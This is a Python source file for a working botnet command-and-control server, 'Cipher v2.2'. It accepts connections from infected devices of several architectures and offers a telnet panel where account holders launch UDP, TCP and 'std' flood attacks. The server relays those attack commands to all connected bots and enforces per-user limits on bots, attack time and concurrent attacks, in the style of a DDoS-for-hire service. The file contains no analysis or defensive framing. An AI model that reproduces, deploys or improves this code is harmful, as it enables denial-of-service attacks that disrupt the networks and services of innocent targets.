import socket
import select
import threading
import time
import os
import sys
import bcrypt
import logging
import errno
from typing import Optional, Dict

CNC_HOST = os.environ.get('CNC_HOST', '172.23.0.255')
MAXFDS = int(os.environ.get('MAXFDS', '100000'))
SS_NAME = "Cipher v2.2"
SS_COPYRIGHT = "@Recon"
SS_VER = "1"
LOGIN_PROMPT = "login"
ACCOUNTS_FILE = "users.txt"
LOGS_DIR = "logs"
BOT_PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 6667
CNC_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 23

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(message)s",
    handlers=[logging.FileHandler("server.log"), logging.StreamHandler()]
)

clients = {}         
managements = {}    
bot_counts = {'x86': 0, 'arm': 0, 'mips': 0}
attack_stats = {'udp': 0, 'tcp': 0, 'std': 0, 'total': 0}
attack_status = 0
accounts = []
state_lock = threading.Lock()
epoll = None
listen_sock = None

active_attacks = {}    
user_timeouts = {}     
TIMEOUT_SECONDS = 30   

def hash_password(password: str) -> str:
    return bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()

def verify_password(hashed: str, password: str) -> bool:
    if isinstance(hashed, str):
        hashed_bytes = hashed.encode()
    else:
        hashed_bytes = hashed
    return bcrypt.checkpw(password.encode(), hashed_bytes)

def load_accounts():
    global accounts
    accounts.clear()
    if not os.path.exists(ACCOUNTS_FILE):
        logging.error(f"Accounts file '{ACCOUNTS_FILE}' not found.")
        return
    with open(ACCOUNTS_FILE, 'r') as f:
        for line in f:
            parts = line.strip().split()
            if len(parts) == 6:
                username = parts[0].strip()
                passwd_hash = parts[1].strip()
                acct_type = parts[2].strip()
                maxbots = int(parts[3].strip())
                maxtime = int(parts[4].strip())
                concurrents = int(parts[5].strip())
                accounts.append({
                    'id': username,
                    'password': passwd_hash,
                    'type': acct_type,
                    'maxbots': maxbots,
                    'maxtime': maxtime,
                    'concurrents': concurrents,
                })

def find_user(username: str) -> Optional[Dict]:
    for acc in accounts:
        if acc['id'] == username:
            return acc
    return None

def log_event(filename: str, message: str):
    os.makedirs(LOGS_DIR, exist_ok=True)
    with open(os.path.join(LOGS_DIR, filename), 'a') as f:
        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")

def trim(s: str) -> str:
    return s.strip()

def fdgets(sock: socket.socket, buffer_size=2048) -> str:
    try:
        data = b""
        while True:
            chunk = sock.recv(1)
            if not chunk:
                break
            data += chunk
            if chunk == b'\n':
                break
        return data.decode(errors='ignore')
    except (BlockingIOError, ConnectionResetError):
        return ""

def make_socket_non_blocking(sock):
    sock.setblocking(False)

def count_arch():
    global bot_counts
    bot_counts = {'x86': 0, 'arm': 0, 'mips': 0}
    with state_lock:
        for client in clients.values():
            if client['connected']:
                arch = client.get('arch', '').lower()
                if 'x86' in arch:
                    bot_counts['x86'] += 1
                elif 'arm' in arch:
                    bot_counts['arm'] += 1
                elif 'mips' in arch:
                    bot_counts['mips'] += 1

def broadcast(message: str, sender_fd: int, sender_nick: str, max_bots: int, msg_type: str, status: int):
    with state_lock:
        if msg_type == "ddos":
            for fd, client in clients.items():
                if client['connected'] and fd != sender_fd:
                    try:
                        os.write(fd, (message + '\n').encode())
                    except OSError:
                        client['connected'] = False
            for fd, user in managements.items():
                if user['connected'] and fd != sender_fd and message.lower() != "ping":
                    try:
                        running_count = len(active_attacks.get(fd, []))
                        prompt_title = f"{user['nickname']} [AttacksRunning:{running_count}]"
                        formatted_msg = f"\r\n\x1b[0m{sender_nick}: {message}"
                        os.write(fd, formatted_msg.encode())
                        prompt = f"\x1b[1;36m(\x1b[37m{prompt_title}\x1b[1;36m@\x1b[37m{user['my_bashline']}\x1b[1;36m)\x1b[37m: "
                        os.write(fd, prompt.encode())
                    except OSError:
                        user['connected'] = False
        elif msg_type == "chat":
            for fd, user in managements.items():
                if user['connected'] and fd != sender_fd:
                    try:
                        running_count = len(active_attacks.get(fd, []))
                        prompt_title = f"{user['nickname']} [AttacksRunning:{running_count}]"
                        prompt = f"\x1b[1;36m(\x1b[37m{prompt_title}\x1b[1;36m@\x1b[37m{user['my_bashline']}\x1b[1;36m)\x1b[37m: "
                        if status == 1:
                            msg = f"\r\n\x1b[1;33m{sender_nick}\x1b[37m Logged \x1b[1;32min\x1b[37m\r\n"
                            os.write(fd, msg.encode())
                        elif status == 2:
                            msg = f"\r\n\x1b[1;33m{sender_nick}\x1b[37m Logged \x1b[1;31mout\x1b[37m\r\n"
                            os.write(fd, msg.encode())
                        else:
                            msg = f"\r\n\x1b[0m{sender_nick}: {message}"
                            os.write(fd, msg.encode())
                        os.write(fd, prompt.encode())
                    except OSError:
                        user['connected'] = False

def clean_expired_attacks():
    now = time.time()
    with state_lock:
        fds_to_clear = []
        for fd, attacks in list(active_attacks.items()):
            active_attacks[fd] = [a for a in attacks if now - a['start_time'] < a['duration']]
            if not active_attacks[fd]:
                fds_to_clear.append(fd)
        for fd in fds_to_clear:
            del active_attacks[fd]
            user_timeouts.pop(fd, None)

def attack_setup(buf: str, client_fd: int, account: dict):
    global attack_stats, active_attacks, user_timeouts
    now = time.time()

    # Check timeout for user
    if client_fd in user_timeouts and now < user_timeouts[client_fd]:
        remaining = int(user_timeouts[client_fd] - now)
        os.write(client_fd, f"\x1b[1;31mTimeout active. Wait {remaining}s before new attack.\r\n".encode())
        return

    with state_lock:
        current_attacks = active_attacks.get(client_fd, [])
        if len(current_attacks) >= account['concurrents']:
            user_timeouts[client_fd] = now + TIMEOUT_SECONDS
            os.write(client_fd, f"\x1b[1;31mMax concurrent attacks reached. Timeout {TIMEOUT_SECONDS}s.\r\n".encode())
            return

    parts = buf.split()
    cmd = parts[0].lower()
    if len(parts) < 5 or cmd not in ["udp", "tcp", "std"]:
        os.write(client_fd, f"{cmd.upper()}: invalid parameters\r\n".encode())
        return
    try:
        seconds = int(parts[3])
    except ValueError:
        os.write(client_fd, f"{cmd.upper()}: invalid time parameter\r\n".encode())
        return
    if seconds > account['maxtime']:
        os.write(client_fd, "\x1b[1;31mError\x1b[37m: Max boot time exceeded!\r\n".encode())
        return

    bot_cmd = " ".join(parts)
    os.write(client_fd, f"Successfully Sent {cmd.upper()} Flood For {seconds} Seconds!\r\n".encode())
    attack_stats[cmd] += 1
    attack_stats['total'] += 1

    with state_lock:
        active_attacks.setdefault(client_fd, []).append({
            'command': bot_cmd,
            'start_time': now,
            'duration': seconds,
            'username': managements.get(client_fd, {}).get('nickname', 'Unknown')
        })

    broadcast(bot_cmd, client_fd, managements[client_fd]['nickname'], account['maxbots'], "ddos", 0)

def epoll_event_loop():
    global epoll, listen_sock, clients
    while True:
        events = epoll.poll(-1)
        for fd, event in events:
            if event & (select.EPOLLERR | select.EPOLLHUP) or not (event & select.EPOLLIN):
                with state_lock:
                    if fd in clients:
                        clients[fd]['connected'] = False
                        try:
                            clients[fd]['sock'].close()
                        except Exception:
                            pass
                        del clients[fd]
                continue
            elif fd == listen_sock.fileno():
                while True:
                    try:
                        client_sock, client_addr = listen_sock.accept()
                        make_socket_non_blocking(client_sock)
                        infd = client_sock.fileno()
                        ip = client_addr[0]
                        with state_lock:
                            dup = any(c['connected'] and c['ip'] == ip for c in clients.values())
                        if dup:
                            client_sock.close()
                            continue
                        epoll.register(infd, select.EPOLLIN | select.EPOLLET)
                        with state_lock:
                            clients[infd] = {
                                'ip': ip, 'arch': '', 'connected': True, 'sock': client_sock
                            }
                    except socket.error as e:
                        if e.errno in (errno.EAGAIN, errno.EWOULDBLOCK):
                            break
                        else:
                            break
                continue
            else:
                with state_lock:
                    client = clients.get(fd)
                if not client:
                    continue
                sock = client['sock']
                client['connected'] = True
                done = False
                while True:
                    buf = fdgets(sock)
                    if not buf:
                        done = True
                        break
                    if '\n' not in buf:
                        done = True
                        break
                    buf = trim(buf)
                    if buf == "PING":
                        try:
                            sock.sendall(b"PONG\n")
                        except socket.error:
                            done = True
                            break
                        continue
                    if buf == "PONG":
                        continue
                    elif buf.startswith("arch "):
                        arch = buf[5:]
                        client['arch'] = arch
                    elif SS_NAME in buf:
                        print(f"\x1b[0mBOT\x1b[1;36m: \x1b[37m{buf}")
                if done:
                    with state_lock:
                        client['connected'] = False
                        try:
                            sock.close()
                        except Exception:
                            pass
                        del clients[fd]

def bot_listener(port: int):
    global listen_sock, epoll
    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen_sock.bind(('0.0.0.0', port))
    listen_sock.listen(128)
    make_socket_non_blocking(listen_sock)
    global epoll
    epoll = select.epoll()
    epoll.register(listen_sock.fileno(), select.EPOLLIN | select.EPOLLET)
    threading.Thread(target=epoll_event_loop, daemon=True).start()
    print(f"[*] Bot listener (epoll) started on port {port}")

def title_writer(client_fd: int):
    spinner_states = ['|', '/', '-', '\\']
    idx = 0
    while managements.get(client_fd, {}).get('connected', False):
        try:
            with state_lock:
                nickname = managements[client_fd]['nickname']
                running_attacks = len(active_attacks.get(client_fd, []))
                connected_devices = len([c for c in clients.values() if c['connected']])

                # Find user's concurrent limit (concurrents) from accounts
                concurrents = 0
                for acc in accounts:
                    if acc['id'] == nickname:
                        concurrents = acc.get('concurrents', 0)
                        break

            spinner = spinner_states[idx % len(spinner_states)]
            title = (f"\033]0; Devices: {connected_devices} {spinner} {nickname} {spinner} "
                     f"Running: {running_attacks}/{concurrents}\007")
            os.write(client_fd, title.encode())
            idx += 1
            time.sleep(0.2)  # update spinner every 0.2 seconds
        except OSError:
            break


def telnet_worker(client_fd: socket.socket, client_ip: str):
    global managements
    try:
        client_fd.sendall(b"\x1b[1;36mKey\x1b[1;36m:\x1b[37m ")
        input_key = fdgets(client_fd)
        if not input_key or input_key.strip().lower() != LOGIN_PROMPT:
            client_fd.sendall(b"\r\nWrong key entered. Closing connection.\r\n")
            client_fd.close()
            return
        client_fd.sendall(b"\033[1A\033[2J\033[1;1H")
        welcome_msg = (
            f"                      \x1b[37m[\x1b[1;32m+\x1b[37m] Welcome To \x1b[4;1;1;36m{SS_NAME}\x1b[0m "
            f"\x1b[1;37mVersion \x1b[1;36m{SS_VER}\x1b[37m [\x1b[1;32m+\x1b[37m]\r\n"
            f"                        \x1b[37m[\x1b[1;32m+\x1b[37m] Enter \x1b[1;33mLogin\x1b[37m Credentials [\x1b[1;32m+\x1b[37m]\r\n"
        )
        client_fd.sendall(welcome_msg.encode())
        client_fd.sendall(b"                               \x1b[37mUsername\x1b[1;33m: ")
        username = trim(fdgets(client_fd))
        if not username:
            client_fd.close()
            return
        client_fd.sendall(b"                               \x1b[37mPassword\x1b[1;33m:\x1b[30m ")
        password = trim(fdgets(client_fd))
        if not password:
            client_fd.close()
            return
        account = find_user(username)
        if not account:
            client_fd.sendall(b"\x1b[37mNo such username!\x1b[1;31m\r\n")
            client_fd.close()
            return
        if not verify_password(account['password'], password):
            client_fd.sendall(b"\x1b[37mUsername\x1b[1;33m OR \x1b[37mPassword Is Wrong\x1b[1;31m!\x1b[37m\r\n")
            log_event("failed_logins.txt", f"Failed Login Attempt From {username} - IP - {client_ip}")
            time.sleep(2)
            client_fd.close()
            return
        managements[client_fd.fileno()] = {
            'connected': True,
            'admin': account['type'] == 'admin',
            'nickname': account['id'],
            'my_ip': client_ip,
            'my_bashline': SS_NAME
        }
        threading.Thread(target=title_writer, args=(client_fd.fileno(),), daemon=True).start()
        broadcast("", client_fd.fileno(), username, MAXFDS, "chat", 1)

        while True:
            with state_lock:
                active_count = len(active_attacks.get(client_fd.fileno(), []))
            os.write(client_fd.fileno(), f"\033]0;{username} [AttacksRunning: {active_count}]@{SS_NAME}\007".encode())

            prompt = f"\x1b[1;36m(\x1b[37m{username}\x1b[1;36m@\x1b[37m{SS_NAME}\x1b[1;36m)\x1b[37m: "
            client_fd.sendall(prompt.encode())
            buf = fdgets(client_fd)
            if not buf:
                break
            buf = trim(buf)
            if not buf:
                continue
            log_event("user_report.log", f"{username}: {buf}")
            buf_lower = buf.lower()

            if buf_lower == "running" or buf_lower == ".running":
                clean_expired_attacks()
                with state_lock:
                    if not active_attacks:
                        client_fd.sendall(b"No active attacks running.\r\n")
                    else:
                        now = time.time()
                        for fd, attacks in active_attacks.items():
                            for attack in attacks:
                                elapsed = now - attack['start_time']
                                remaining = attack['duration'] - elapsed
                                if remaining < 0:
                                    remaining = 0
                                msg = f"User: {attack['username']}, Attack: {attack['command']}, Time Left: {int(remaining)}s\r\n"
                                client_fd.sendall(msg.encode())
                continue

            if buf_lower in ("cls", "clear", "reset"):
                client_fd.sendall(b"\033[2J\033[1;1H")
                welcome_line = (
                    f"\x1b[37mWelcome {username} To The \x1b[4;1;1;36m{SS_NAME}\x1b[0m "
                    f"\x1b[1;37mc2 Version \x1b[1;36m{SS_VER} By \x1b[1;36m{SS_COPYRIGHT}\r\n"
                )
                client_fd.sendall(welcome_line.encode())
                continue

            if buf_lower in ("bots", "devices"):
                count_arch()
                client_fd.sendall(
                    f"\x1b[1;33m|\x1b[37m{SS_NAME}.x86 [\x1b[37m{bot_counts['x86']}\x1b[1;36m]\r\n"
                    f"\x1b[1;33m|\x1b[37m{SS_NAME}.arm [\x1b[37m{bot_counts['arm']}\x1b[1;36m]\r\n"
                    f"\x1b[1;33m|\x1b[37m{SS_NAME}.mips [\x1b[37m{bot_counts['mips']}\x1b[1;36m]\r\n".encode()
                )
                connected_bots = len([c for c in clients.values() if c['connected']])
                available_bots = min(connected_bots, account['maxbots'])
                client_fd.sendall(
                    f"\x1b[1;32m|\x1b[37mAvailable.bots [\x1b[37m{available_bots}\x1b[1;36m]\r\n"
                    f"\x1b[1;33m|\x1b[37mTotal.bots [\x1b[37m{connected_bots}\x1b[1;36m]\r\n".encode()
                )
                continue

            if any(cmd in buf_lower for cmd in ["udp", "tcp", "std"]):
                if attack_status == 0:
                    log_event("attacks.log", f"{username} Sent Attack: {buf}")
                    attack_setup(buf, client_fd.fileno(), account)
                else:
                    client_fd.sendall(b"\x1b[37mCommands Are Currently Disabled!\x1b[0m\r\n")
                continue

            if len(buf) >= 3:
                broadcast(buf, client_fd.fileno(), username, MAXFDS, "chat", 0)

    except Exception as e:
        logging.error(f"Telnet worker exception: {e}")
    finally:
        fd = client_fd.fileno()
        if fd in managements:
            broadcast("", fd, managements[fd]['nickname'], MAXFDS, "chat", 2)
            managements[fd]['connected'] = False
            del managements[fd]
        try:
            client_fd.close()
        except Exception:
            pass


def telnet_listener(port: int):
    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen_sock.bind(('0.0.0.0', port))
    listen_sock.listen(5)
    print(f"[*] Telnet listener started on port {port}")
    while True:
        try:
            client_fd, client_addr = listen_sock.accept()
            print(f"[*] Accepted connection from {client_addr[0]}")
            threading.Thread(target=telnet_worker, args=(client_fd, client_addr[0]), daemon=True).start()
        except Exception as e:
            print(f"[-] Error accepting connection: {e}")
            time.sleep(1)

def main():
    load_accounts()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        host_ip = s.getsockname()[0]
        if host_ip != CNC_HOST:
            print("Host IP mismatch: exiting.")
            sys.exit(1)
    except Exception:
        pass
    finally:
        s.close()
    bot_listener(BOT_PORT)
    threading.Thread(target=telnet_listener, args=(CNC_PORT,), daemon=True).start()
    while True:
        try:
            clean_expired_attacks()  
            broadcast("PING", -1, SS_NAME, MAXFDS, "ddos", 0)
            time.sleep(60)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Main loop error: {e}")
            time.sleep(60)

if __name__ == "__main__":
    main()
